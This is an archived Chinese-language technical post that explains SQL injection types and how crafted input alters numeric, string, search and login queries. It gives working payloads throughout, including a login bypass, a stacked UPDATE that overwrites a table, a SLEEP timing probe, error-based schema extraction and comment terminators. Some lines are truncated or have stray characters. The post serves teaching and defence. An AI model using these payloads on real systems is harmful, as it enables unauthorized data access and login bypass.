---
title: "SQL Injection: Response Signals and Query Context"
title_zh: "SQL 注入类型：返回信号与查询上下文"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: SQL Injection Types
date: 2019-01-22 19:59:00
slug: SQL-Injection-Types
permalink: writing/SQL-Injection-Types/
topic: Application security
summary: "Comparing response channels and explaining how input changes numeric, string and search queries."
summary_zh: "比较布尔、报错、联合查询、多语句和时间信号等注入方式，再拆解数字、字符串与搜索场景的查询结构，通过逻辑优先级和闭合示例解释输入如何改变语义。"
format_label: Technical notes
featured_rank: 0
missing_images: 0
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

   > Boolean-based blind SQL injection（布尔型注入）
   > Error-based SQL injection（报错型注入）
   > UNION query SQL injection（可联合查询注入）
   > Stacked queries SQL injection（可多语句查询注入）
   > Time-based blind SQL injection（基于时间延迟注入）

**基于官方的型式，我又发现了这5种：**

> 数字型,字符型,搜索型,内联型,终止型

## 详细解读

### Boolean-based blind SQL injection（布尔型注入）

通过判断页面返回情况获得想要的信息。
如下SQL注入：
1 ```http://app.example.invalid/view?id=1 and substring(version(),1,1)=5```
如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。攻击者就可以通过这种方式获取到MySQL的各类信息。

### Error-based SQL injection（报错型注入）

如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。

典型的就是利用group by的duplicate entry错误

如下SQL注入：

`1 http://app.example.invalid/view?id=1%20AND%20(SELECT%207506%20FROM(SELECT%20COUNT(*),CONCAT(0x717a707a71(SELECT%20MID((IFNULL(CAST(schema_name%202AS%20CHAR),0x20)),1,54)%20FROM%20INFORMATION_SCHEMA.SCHEMATA%203LIMIT%202,1),0x7178786271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_4SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)`

在SQL错误中会包含这样的信息： `Duplicate entry 'qzpzqttqxxbq1' for key 'group_key'`，其中qzpzq和qxxbq分别是0x717a707a71和0x7178786271，用这两个字符串包住了tt（即数据库名），是为了方便sql注入程序从返回的错误内容中提取出信息。

### UNION query SQL injection（可联合查询注入）

最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。

如下SQL注入：

```1 http://app.example.invalid/view?id=1 UNION ALL SELECT SCHEMA_NAME, DEFAULT_CHARACTER_SET_NAME FROM IN```

### Stacked queries SQL injection（可多语句查询注入）

即能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。

如下SQL注入：

```1 http://app.example.invalid/view?id=1;update t1 set content = 'aaaaaaaaa'```

在第二次请求```http://app.example.invalid/view?id=1```时，会发现所有的content都被设置为aaaaaaaaa了。

### Time-based blind SQL injection（基于时间延迟注入）

页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度非常慢。

如下SQL注入：

```1 http://app.example.invalid/view?q=abc' AND (SELECT * FROM (SELECT(SLEEP(5)))VCVe) OR 1 = '```

该请求会使MySQL的查询睡眠5S，攻击者可以通过添加条件判断到SQL中，比如IF(substring(version(),1,1)=5, sleep(5), ‘t’) AS value就能做到类似boolean注入的效果，如果睡眠了5s，那么说明MySQL版本为5，否则不是，但这种方式获取信息的速度就会很慢了，因为要做非常多的判断，并且需要花时间等待，不断地去测试出相应的值出来。

### 数字型注入点

测试方法：

```
http://app.example.invalid/test.php?id=100 and 1=1 返回成功

http://app.example.invalid/test.php?id=100 and 1=2 返回失败
```

为什么第一个会返回成功，而第二个是返回失败呢？

原因如下：

> 假设我们网站的SQL查询的语句是这样的
> ```SELECT * FROM news WHERE id=$id```
> 这里的$id是用户提交的
> 当我们输入的是
> ```100 and 1=1```
> 语句就变成了这样
> ```SELECT * FROM news WHERE id=100 and 1=1```

>这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了
>而在and右边，1=1也是恒成立的，所以整个语句返回的是成功
>当然，如果后面改成了1=2的话，因为1=2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败

### 字符型注入点

测试方法：

```
http://app.example.invalid/test.php?name=man' and '1'='1 返回成功

http://app.example.invalid/test.php?name=man' and '1'='2返回失败
```

这里就使上面的数字型变为了字符型

原因如下：

> 还是假设我们网站的SQL语句是这样的
> ```SELECT * FROM news WHERE name='$name'```
> 当我们构造输入为下面这个的时候
> ```man' and '1'='1```
> 语句就变成了
> ```SELECT * FROM news WHERE name='man' and '1'='1'```

发现什么了没？这个SQL已经闭合了

> 还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功
> 同理可知如果后面是1'='2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符

比如这样

```
  http://app.example.invalid/test.php?name=man' and 'a'='a 返回成功
  http://app.example.invalid/test.php?name=man' and 'a'='b返回失败 
```

### 搜索型注入点 — 目前常见的

测试方法

```
http://app.example.invalid//test.php?keyword=python%' and 1=1 and '%'='

http://app.example.invalid//test.php?keyword=python%' and 1=2 and '%'='
```

假设我们的SQL查询语句是这样的

```
  SELECT * FROM news WHERE keyword like '%$keyword%'
```

这里的$keyword是用户的输入
当我们输入以下语句的时候
```pt%' and 1=1 and '%'='```
  最终我们得到的语句是这样的
  ```SELECT * FROM news WHERE keyword like '%pt%' and 1=1 and '%'='%'```
  这个语句又一次的闭合了

这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误

我们可以把这个语句分为三段

```
  SELECT * FROM news WHERE keyword like '%python%'

  and 1=1

  and '%'='%'
```

> 第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入）
> 第二句也是，第三句也是，因为自己肯定等于自己啊
> 但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理

### 内联式SQL注入 –常用

内联注入是指查询注入SQL代码后，原来的查询仍然全部执行

假设我们的网站SQL查询语句是这样的

```
SELECT * FROM admin WHER username='$name' AND password ='$passwd'
```

这一看就是个登录页面的代码

假如我们构造如下语句提交到登录框中的username

```' or ''='```

或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法

提交到username我们的语句就会成为这样

  `SELECT * FROM admin WHER username='' or ''='' AND password ='mdzz'`

`mdzz`是我们随便输入的字符串
而提交到``password`则会是这样的

  `SELECT * FROM admin WHER username='mdzz' AND password ='' or ''=''`

注:
  在SQL语句中，AND的优先级是大于OR的
  先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句

这是``username`框的

  `SELECT * FROM admin WHER username=''`

`or`

 ``''='' AND password ='mdzz'``

或者``password`框的是这样

  `SELECT * FROM admin WHER username='mdzz' AND password =''`

  `or`

  ``''=''``

我们首先用第一个来分析

首先计算AND之后

  `SELECT * FROM admin WHER username=''`返回失败

  `or`

  ``''='' AND password ='mdzz'``返回失败

数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的

但是我们的password情况就不一样了

  `SELECT * FROM admin WHER username='mdzz' AND password =''`

  `or`

  ``''=''``

这里我们第一句是返回失败的，但是我们的第二句''=''是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功

返回成功之后我们就会绕过登录表单直接登录系统了

### 终止式SQL注入—常用

终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句

于是被注释的查询不会被执行，我们还是拿上面那个例子举例

我们上面已经知道，在username框内填入

  ' or ''='
程序是不会返回成功的，我们就没有办法在username做文章了吗？

错了，我们还有终止式

还是上面那个SQL查询语句

```SELECT * FROM admin WHER username='$name' AND password ='$passwd'```

这里我们构造如下username输入

  ' or ''='' --

之后我们就可以得到如下的查询语句

 ```SELECT * FROM admin WHER username='' or ''='' --' AND password ='mdzz'```

这里的mdzz是我们随便输入的，--是注释符

这样，我们的语句就可以分为三个部分了

  `SELECT * FROM admin WHER username=''`

  `or ''=''`返回成功

  ``--' AND password ='mdzz'``

第一句肯定是返回失败的，但是我们第二句会返回成功

后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录

下面是我们常见的一些终止方式
终止字符串：

```mssql
-- ， #， %23， %00， /*
```

终止方法：

```sql
-- , ‘-- , ‘)-- , ) -- , ‘)) --, ))--
```
